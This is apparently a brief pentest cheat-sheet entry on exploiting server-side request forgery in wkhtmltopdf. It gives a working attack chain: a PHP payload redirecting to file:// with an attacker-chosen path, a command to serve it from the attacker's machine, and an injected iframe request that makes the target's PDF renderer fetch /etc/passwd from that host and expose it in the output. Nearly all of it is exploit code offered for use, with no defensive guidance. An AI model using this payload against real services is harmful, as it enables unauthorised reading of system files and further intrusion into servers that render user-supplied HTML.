# wkhtmltopdf SSRF

wkhtmltopdf is a command line tool to render HTML into PDF using Qt WebKit. It is vulnerable to SSRF.

### Exploitation <a href="#exploitation" id="exploitation"></a>

Create a PHP payload to read local file.

```
<?php header('location:file://'.$_REQUEST['x']); ?>
```

Then start web server in local machine.

```
php -S 0.0.0.0:8000
```

Send request to where wkhtmltopdf is affected. For example,

```
/htmltopdf?item=<iframe src=http://10.0.0.1:8000/test.php?x=/etc/passwd width=1000px height=1000px></iframe>
```

Now we can see the system users list via a generated PDF.
